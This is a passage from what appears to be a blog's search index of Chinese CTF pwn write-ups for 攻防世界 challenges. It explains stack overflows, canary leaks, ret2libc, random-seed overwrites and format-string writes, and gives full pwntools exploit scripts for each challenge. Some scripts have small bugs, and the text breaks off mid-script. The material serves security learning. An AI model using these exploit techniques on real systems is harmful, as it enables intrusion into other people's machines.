<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>攻防世界pwn-反应釜开关</title>
      <link href="/ctf-pwn/c42410d2.html"/>
      <url>/ctf-pwn/c42410d2.html</url>
      
        <content type="html"><![CDATA[<p>(简单的栈溢出)<br>checksec查看附件如下:<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230904210354.png" style="zoom:80%;" /><br>开启了内存不可执行以及部分重定位. 直接运行本程序, 如图所示, 题目中直接给出了一个地址, 不知道能不能利用.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230904211159.png" style="zoom:80%;" /><br>用IDA打开附件查看, 逻辑比较清晰, 其中有<code>system(&#39;/bin/sh&#39;)</code>, 而且有<code>gets</code>函数, 可以直接溢出然后跳转执行.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230904211836.png" style="zoom:80%;" /><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230904211856.png" style="zoom:80%;" /><br><code>v5</code>长度为512, 构造payload<code>b&#39;a&#39; * 512 + b&#39;a&#39; * 8 + p64(shell_addr)</code><br>完整exp如下:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment"># sh = process('./fanyin')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'61.147.171.105'</span><span class="token punctuation">,</span> <span class="token number">51859</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./fanyin'</span><span class="token punctuation">)</span>shell_addr <span class="token operator">=</span> <span class="token number">0x4005F6</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">512</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-pwn1</title>
      <link href="/ctf-pwn/1bdd2aa8.html"/>
      <url>/ctf-pwn/1bdd2aa8.html</url>
      
        <content type="html"><![CDATA[<p>checksec检查<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230817212438.png"  style="zoom:50%;" /><br>除了PIE外所有保护全开.<br>程序的大致逻辑是一个输入输出, 先将输入存储到缓冲区, 然后再输出<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230902210031.png"  style="zoom: 80%;" /></p><p>IDA打开后程序的主逻辑如下:<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230902210914.png"  style="zoom: 80%;" /><br>程序中没有发现<code>system</code>函数以及<code>bin/sh</code>等, 只有<code>read</code>, <code>puts</code>, <code>write</code>. 附件中给出了<code>libc</code>, <code>libc</code>中有可利用的<code>execve</code><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230902211303.png"  style="zoom: 80%;" /><br>大致思路是要通过主程序去泄漏出<code>libc</code>的基地址, 然后通过libc中的<code>execve</code>去get shell.<br>因为开启了canary, 首先要去找到canary的值, 由于输入值和canary的值在栈中相邻, 因此可以通过puts函数泄漏出canray的值.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230902212752.png"  style="zoom: 80%;" /><br>可以第一步输入<code>&#39;a&#39; * 0x88</code>, 然后第二步输出时泄漏canary的地址. 但是因为在发送<code>&#39;a&#39; * 0x88</code>时会在末尾追加<code>\n</code>, 因此会将canary低位的<code>\x00</code>覆盖掉, 所以还要还原.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230902214043.png"  style="zoom:50%;" /><br>在得到canary的值后, 就需要去泄漏出libc的基地址. 因为程序中有使用到<code>puts</code>函数, 所以通过调用<code>puts</code>函数去计算出<code>puts</code>函数的地址, 然后通过<code>plt</code>, <code>got</code>表的调用关系去计算出libc的基地址. 然后再算出运行时<code>execve</code>的地址, 来进行调用.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230902214739.png"   /></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>  <span class="token comment"># sh = process('./babystack')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'61.147.171.105'</span><span class="token punctuation">,</span> <span class="token number">49628</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./babystack'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>execve_addr <span class="token operator">=</span> <span class="token number">0x45216</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>main <span class="token operator">=</span> <span class="token number">0x400908</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x400A93</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span><span class="token punctuation">)</span> <span class="token comment">#通过覆盖掉\x00来使得puts泄漏出canary</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#将末尾的0xa替换回来</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"canary value : 0x%x"</span> <span class="token operator">%</span> canary<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>payload_1 <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span>  \ p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span> <span class="token comment">#利用puts函数输出puts函数的地址</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload_1<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>put_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts address : 0x%x"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>put_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> put_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token comment">#计算基地址</span>bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> execve_addrsh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token comment">#跳转到getshell</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-guess_num</title>
      <link href="/ctf-pwn/a1902526.html"/>
      <url>/ctf-pwn/a1902526.html</url>
      
        <content type="html"><![CDATA[<p>通过IDA打开附件后，其中有srand随机数函数，当随机数种子变时，无论生成多少次随机数，所产生的随机数序列都是相同的。<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230714100108.png" style="zoom:50%;" /></p><p>使用gets()函数进行处理，可以进行溢出，且输入和seed在栈空间中是连续的，在输入时，覆盖到seed[0] 即可</p><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230714141012.png" style="zoom:50%;" />gets获取到的输入与seed数组在栈中是连续的，gets长度为32，因此构造payload为<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">32</span> <span class="token operator">+</span> <span class="token string">b'1000'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中“1000”，是设置的随机数种子，在输入过程中，“1000”是按字符形式读取的，所以在生成时该数为“0x30303031”</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;time.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;cstdlib></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>  <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">0x30303031u</span><span class="token punctuation">;</span>    <span class="token function">srand</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> number <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        cout<span class="token operator">&lt;&lt;</span>number<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//在Linux下进行编译</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成随机数：6235463161</p><p>python脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span>libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token comment">#sh = remote("61.147.171.105", 59395)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">32</span> <span class="token operator">+</span> <span class="token string">b'1000'</span>libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">0x30303031</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name:'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'number'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过ctypes库来调用c函数生成随机数</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-forgot</title>
      <link href="/ctf-pwn/be50b3b8.html"/>
      <url>/ctf-pwn/be50b3b8.html</url>
      
        <content type="html"><![CDATA[<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230720102348.png" style="zoom:50%;" />防护只开了不可执行。运行该程序，是一个邮件注册的东西。程序大致逻辑就是输入一个用户名，然后输入一个邮箱账号，然后对邮箱账号进行一个规范性检查，通过一个内嵌switch-case的循环实现，邮箱账号的每一个进行匹配检查<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230720102750.png" style="zoom:50%;" /><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230720102812.png" style="zoom:50%;" />在main函数结尾处有一个函数指针，执行v3数组里的函数<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230720102933.png" style="zoom:50%;" />v3数组里面是相应的puts输出函数。在该程序中存在有现成的system  cat flag的函数<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230720103051.png" style="zoom:50%;" />又存在scanf函数，存在溢出点，且v3与输入的邮箱账号在同一个栈中，考虑通过修改v3数组，使其指向spawn函数<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230720103322.png" style="zoom:80%;" />input_name的长度为32，用32个“a”填充后，从for循环中跳出来后flag_value的值为2，对应到最后的函数指针上，会执行v3数组中第二个元素，也就是说spawn函数的地址要填充到v3的第二个元素处，v3每个元素的类型为dword，因此还需要填充4个字符，在填充spawn的地址构造的payload为`payload = b'a' * 36 + p32(spawn_addr`完整exp如下：<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span>pwn_addr <span class="token operator">=</span> <span class="token number">0x80486cc</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">36</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pwn_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"What is your name?\n"</span><span class="token punctuation">,</span> <span class="token string">b'aaaa'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Enter the string to be validate"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-dic_game</title>
      <link href="/ctf-pwn/7551b35e.html"/>
      <url>/ctf-pwn/7551b35e.html</url>
      
        <content type="html"><![CDATA[<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718102541.png"  style="zoom:50%;" /><p>关于elf文件结构<br>.got全局偏移表<br>.plt程序链接表</p><p>#覆盖随机数种子</p><p>又是一个猜数游戏，checksec如下<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718141443.png"  style="zoom:50%;" /></p><p>存在溢出函数read，用time来作为当前的随机数种子<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718141653.png"  style="zoom:50%;" /><br>在sub_556DF3600A20中，v1为输入的数，v2为随机数，如果相等则win，返回1<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718142043.png" style="zoom:50%;" /></p><p>当50次都输入正确是，进入sub_556DF3600B28函数，该函数将输出flag<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718142153.png"  style="zoom:50%;" /></p><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718142228.png"  style="zoom:50%;" /><p>因此，只要能知道随机数种子就可以预测每一次的数字，从而获得flag。<br>存在的溢出点read函数则可以帮助实现。<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718142424.png"  style="zoom:50%;" /><br>buf的大小为55，而read分配的空间为0x50，也就是80，buf在栈中到seed的偏移为64。<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230718142544.png"  style="zoom:50%;" /><br> 通过输入name进行溢出覆盖到seed，使得seed可控，从而可预测出随机数</p><p>利用exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span>libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">0x30303031</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">64</span> <span class="token operator">+</span> <span class="token string">b'1000'</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Welcome, let me know your name:"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Give me the point(1~6):"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>[[攻防世界pwn-guess_num]]</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-cgpwn2</title>
      <link href="/ctf-pwn/ee66d7d5.html"/>
      <url>/ctf-pwn/ee66d7d5.html</url>
      
        <content type="html"><![CDATA[<p>没有开启任何防护<br>存在system函数，存在gets函数可溢出<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230715151040.png" style="zoom:50%;" /></p><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230715151024.png" style="zoom:50%;" />要getshell的话需要构造“/bin/sh”参数，但是本身并没有这个字符串，因此可以在输入name时，输入“/bin/sh"，然后在构造payload时将”/bin/sh"的地址写入<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span>sys_addr <span class="token operator">=</span> <span class="token number">0x804855A</span>name <span class="token operator">=</span> <span class="token string">b'/bin/sh'</span>name_addr <span class="token operator">=</span> <span class="token number">0x804A080</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x26</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please tell me your name'</span><span class="token punctuation">,</span> name <span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'hello,you can leave some message here:'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>[[攻防世界pwn-string]]</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-CGFsb</title>
      <link href="/ctf-pwn/4b131921.html"/>
      <url>/ctf-pwn/4b131921.html</url>
      
        <content type="html"><![CDATA[<p>canary保护机制<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230713084732.png" style="zoom:50%;" /><br>在函数入口处，会从gs寄存器上取一个值存放到栈上，在函数退出时会去检查栈中的这个值是否发生变化。<br>存在printf函数，可以通过偏移泄漏出canary的值<br>格式化字符串漏洞，通过%n来修改参数的值<br><a href="https://bbs.kanxue.com/thread-253638.htm">[原创]格式化字符串漏洞简介-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p><p><code>%n</code>计算字符个数</p><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230713163639.png" style="zoom:50%;" /><p>pwn CGfsb</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">55756</span><span class="token punctuation">)</span><span class="token comment"># sh = process("./e41a0f684d0e497f87bb309f91737e4d")</span>pwnme_addr <span class="token operator">=</span> <span class="token number">0x804A068</span><span class="token comment"># canary_addr = b"%35$p" #可以泄漏出canary的值 </span>payload1 <span class="token operator">=</span> p32<span class="token punctuation">(</span>pwnme_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> <span class="token string">b'%10$n'</span> <span class="token comment">#利用%n，将pwnme处的值重写</span><span class="token comment"># gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"please tell me your name:\n"</span><span class="token punctuation">,</span> <span class="token string">b'aaa'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"leave your message please:\n"</span><span class="token punctuation">,</span> payload1 <span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>[[攻防世界pwn-mary-morton]]</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-level2</title>
      <link href="/ctf-pwn/6d0f7c20.html"/>
      <url>/ctf-pwn/6d0f7c20.html</url>
      
        <content type="html"><![CDATA[<p>存在溢出点<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230707221748.png" style="zoom:50%;" /><br>存在system调用，以及字符”&#x2F;bin&#x2F;sh”，可以构造返回地址到 system调用，但是如何将“&#x2F;bin&#x2F;sh”参数写入。<br>根据函数调用约定写入覆盖内容1</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>sys_addr <span class="token operator">=</span> <span class="token number">0x8048320</span>binsh <span class="token operator">=</span> <span class="token number">0x804A024</span>whaterver_addr <span class="token operator">=</span> <span class="token number">0xcacacaca</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>whatever_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Input:"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'cat flag'</span><span class="token punctuation">)</span>sh<span class="token 